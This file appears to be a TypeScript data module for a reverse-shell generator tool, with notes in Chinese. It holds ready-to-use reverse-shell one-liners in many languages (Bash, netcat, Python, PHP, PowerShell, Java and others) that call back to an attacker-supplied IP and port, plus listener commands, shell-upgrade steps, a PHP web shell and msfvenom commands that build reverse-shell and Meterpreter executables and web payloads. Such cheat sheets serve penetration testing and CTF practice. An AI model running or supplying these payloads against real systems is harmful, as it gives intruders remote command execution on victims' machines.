/** Reverse shell one-liners. `{ip}` / `{port}` are replaced live by the UI.
 *  Sources: pentestmonkey cheat sheet, 0dayCTF/reverse-shell-generator, PayloadsAllTheThings. */

export interface RevShell {
  lang: string;
  cmd: string;
  note?: string;
}

export const REV_SHELLS: RevShell[] = [
  {
    lang: "Bash -i",
    cmd: "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    note: "最常用;需目标支持 /dev/tcp (bash 内建)",
  },
  {
    lang: "Bash 196",
    cmd: "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
  },
  {
    lang: "Bash read line",
    cmd: "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
  },
  {
    lang: "Bash UDP",
    cmd: "sh -i >& /dev/udp/{ip}/{port} 0>&1",
    note: "UDP 反弹,监听端用 nc -u -lvnp {port}",
  },
  {
    lang: "Netcat -e",
    cmd: "nc -e /bin/sh {ip} {port}",
    note: "需要 nc 编译了 -e (传统 netcat / ncat)",
  },
  {
    lang: "Netcat mkfifo",
    cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    note: "openbsd nc 也可用,最通用的 nc 方案",
  },
  {
    lang: "Netcat (bash)",
    cmd: "nc {ip} {port} -e /bin/bash",
  },
  {
    lang: "socat TCP",
    cmd: "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
    note: "配合监听端 socat 使用,直接获得完整交互 PTY",
  },
  {
    lang: "socat 全双工",
    cmd: "socat TCP:{ip}:{port} EXEC:'sh',pty,stderr",
  },
  {
    lang: "Perl",
    cmd: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
  },
  {
    lang: "Perl (Windows)",
    cmd: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    note: "目标为 Windows + ActivePerl/Strawberry 时使用",
  },
  {
    lang: "Python",
    cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
    note: "直接带 pty,交互体验好",
  },
  {
    lang: "Python (短版)",
    cmd: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
  },
  {
    lang: "Python (Windows)",
    cmd: "python -c \"import socket,os,threading,subprocess;pc=socket.socket(socket.AF_INET,socket.SOCK_STREAM);pc.connect(('{ip}',{port}));while True: data=pc.recv(1024).decode();if len(data)==0:break;cmd=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);pc.send(cmd.stdout.read()+cmd.stderr.read())\"",
  },
  {
    lang: "PHP",
    cmd: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    note: "适合有 php-cli 的 web 机器;fd=3",
  },
  {
    lang: "PHP (proc_open)",
    cmd: "php -r '$s=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);proc_close($proc);'",
  },
  {
    lang: "PHP (web 场景)",
    cmd: "<?php set_time_limit(0); $s=fsockopen(\"{ip}\",{port}); $p=array(0=>$s,1=>$s,2=>$s); while(true){ $r=array($s); stream_select($r,$w,$e,null); $o=fread($s,4096); if($o){ $x=shell_exec($o); fwrite($s,$x); } } ?>",
    note: "写入 web 可访问文件后浏览器访问触发",
  },
  {
    lang: "Ruby",
    cmd: "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
  },
  {
    lang: "Ruby (Windows)",
    cmd: "ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
  },
  {
    lang: "Go",
    cmd: "package main\nimport (\n  \"net\"\n  \"os/exec\"\n)\nfunc main() {\n  c, _ := net.Dial(\"tcp\", \"{ip}:{port}\")\n  cmd := exec.Command(\"/bin/sh\")\n  cmd.Stdin = c\n  cmd.Stdout = c\n  cmd.Stderr = c\n  cmd.Run()\n}",
    note: "保存为 rev.go,go run rev.go 或编译后执行",
  },
  {
    lang: "Node.js",
    cmd: "require('child_process').exec(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\")",
  },
  {
    lang: "Node.js (全双工)",
    cmd: "(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect({port}, \"{ip}\", function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();",
    note: "保存为 rev.js,node rev.js",
  },
  {
    lang: "PowerShell",
    cmd: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$t=([text.encoding]::ASCII).GetBytes($o2);$s.Write($t,0,$t.Length);$s.Flush()};$c.Close()\"",
  },
  {
    lang: "PowerShell (短)",
    cmd: "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$s.Write([text.encoding]::ASCII.GetBytes((iex $d 2>&1|Out-String)),0,$t.Length)}",
  },
  {
    lang: "Java",
    cmd: "public class Rev { public static void main(String[] a) { String host=\"{ip}\"; int port={port}; String cmd=\"/bin/sh\"; try { Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); java.net.Socket s=new java.net.Socket(host,port); java.io.InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream(); java.io.OutputStream po=p.getOutputStream(), so=s.getOutputStream(); while(!s.isClosed()) { while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) {} } }; p.destroy(); s.close(); } catch (Exception e) {} } }",
    note: "保存为 Rev.java:javac Rev.java && java Rev",
  },
  {
    lang: "Lua",
    cmd: "lua5.1 -e 'local host,port=\"{ip}\",{port} local socket=require(\"socket\") local s=assert(socket.tcp()) s:connect(host,port) while true do local r,x=s:receive() local f=assert(io.popen(r,\"r\")) local b=f:read(\"*a\") s:send(b) end'",
    note: "仅 Linux (需要 lua socket 库)",
  },
  {
    lang: "Awk",
    cmd: "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while (1) { printf \"> \" |& s; if ((s |& getline c) <= 0) break; while ((c |& getline) > 0) print $0 |& s; close(c) }}' /bin/sh",
    note: "gawk 专用",
  },
  {
    lang: "Telnet (mkfifo)",
    cmd: "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF",
  },
  {
    lang: "OpenSSL (加密隧道)",
    cmd: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
    note: "监听端: openssl s_server -quiet -key key.pem -cert cert.pem -port {port},流量 TLS 加密",
  },
];

export const LISTENERS: { name: string; cmd: string; note?: string }[] = [
  { name: "Netcat", cmd: "nc -lvnp {port}" },
  { name: "Netcat (rlwrap 交互)", cmd: "rlwrap -cAr nc -lvnp {port}", note: "rlwrap 提供方向键/历史记录" },
  {
    name: "socat (TTY 监听)",
    cmd: "socat TCP-LISTEN:{port},reuseaddr,fork FILE:`tty`,raw,echo=0",
    note: "配合 socat 反弹使用,直接得到全交互 shell",
  },
  { name: "ncat (SSL)", cmd: "ncat --ssl -lvnp {port}", note: "配合 openssl 加密反弹" },
  { name: "PowerShell (Windows 监听)", cmd: "powercat -l -p {port}" },
];

export const TTY_UPGRADES: { name: string; cmd: string; note?: string }[] = [
  { name: "python pty", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", note: "python -c 同理 (python2)" },
  { name: "script", cmd: "script -qc /bin/bash /dev/null" },
  {
    name: "完整交互 (本机执行)",
    cmd: "# 反弹 shell 里执行 python pty 后按 Ctrl+Z 挂起,然后在本地依次执行:\nstty raw -echo; fg\n# 回车两下,然后在反弹 shell 里:\nexport TERM=xterm-256color\nexport SHELL=/bin/bash\nstty rows 40 cols 120",
  },
  { name: "stty 设置窗口", cmd: "stty rows 40 cols 120", note: "在交互 shell 中执行,避免 vi 错位" },
];

export const MSFVENOM: { name: string; cmd: string }[] = [
  { name: "Linux ELF x64", cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf" },
  { name: "Linux ELF x86", cmd: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf" },
  { name: "Windows EXE", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe" },
  { name: "Windows DLL", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f dll -o shell.dll" },
  { name: "Windows Service", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe-service -o shell.exe" },
  { name: "PHP", cmd: "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php" },
  { name: "JSP", cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -w /var/www/html/shell.jsp" },
  { name: "WAR", cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war" },
  { name: "ASP", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f asp -o shell.asp" },
  { name: "ASPX", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx" },
  { name: "Python", cmd: "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw -o shell.py" },
  { name: "Bash", cmd: "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh" },
  { name: "PowerShell", cmd: "msfvenom -p cmd/windows/reverse_powershell LHOST={ip} LPORT={port} -f raw -o shell.ps1" },
  { name: "Meterpreter (Windows)", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o met.exe" },
];
